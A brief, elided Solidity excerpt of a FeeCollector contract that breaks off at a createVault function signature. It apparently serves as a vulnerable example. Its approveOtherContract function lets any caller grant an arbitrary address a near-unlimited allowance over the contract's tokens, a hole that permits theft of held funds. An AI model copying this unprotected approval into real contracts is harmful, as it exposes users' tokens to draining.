...
contract FeeCollector  {
  ...
  constructor() {
    ...
    function approveOtherContract(IERC20 token, address recipient) external {
        token.approve(recipient, 1000000000000000000000000000000000);
    }
  
    
    
    function createVault(string memory name, IERC20 token, uint256 amount, uint256 duration) public returns(uint256 vaultId) {
